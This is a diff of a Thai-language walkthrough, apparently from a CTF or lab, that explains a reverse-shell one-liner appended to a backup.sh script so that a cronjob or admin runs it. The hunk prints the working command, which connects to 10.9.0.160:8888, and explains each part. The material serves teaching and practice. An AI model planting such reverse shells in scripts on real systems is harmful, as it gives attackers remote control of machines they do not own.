@@ -567,10 +567,12 @@ echo "bash -i >& /dev/tcp/10.9.0.160/8888 0>&1" >> backup.sh
 
 📌 อธิบาย:
 
-- `bash -i`: เปิด interactive shell
-- `>& /dev/tcp/10.9.0.160/8888`: ส่งข้อมูลจาก shell ไปยังเครื่อง IP 10.9.0.160 ผ่าน TCP port 8888
-- `0>&1`: ส่ง input/output ผ่าน socket เดียวกัน
-- `>> backup.sh`: append คำสั่งไปยังไฟล์ `backup.sh`
+- `bash -i`:
+   - เปิด interactive shell หมายถึง shell ที่พร้อมรับ input/output จากผู้ใช้
+   - ต้องเป็น `-i` เพื่อให้ shell ทำงานในแบบโต้ตอบ (interactive) ผ่าน TCP connection ได้
+- `>& /dev/tcp/10.9.0.160/8888`: ส่งข้อมูลจาก shell ไปยังเครื่อง IP `10.9.0.160` ผ่าน TCP port `8888`
+- `0>&1`: เชื่อม stdin เข้ากับ stdout → ใช้ socket เดียวในการรับ/ส่งข้อมูล
+- `>> backup.sh`: 	เพิ่มคำสั่งนี้ลงท้ายไฟล์ `backup.sh` โดยไม่ลบเนื้อหาเดิม
 
 📎 หมายเหตุ:
 Reverse shell จะทำงานก็ต่อเมื่อมี service (หรือ admin) มารันไฟล์ `backup.sh` ซึ่งมักเป็น cronjob หรือสคริปต์บน host
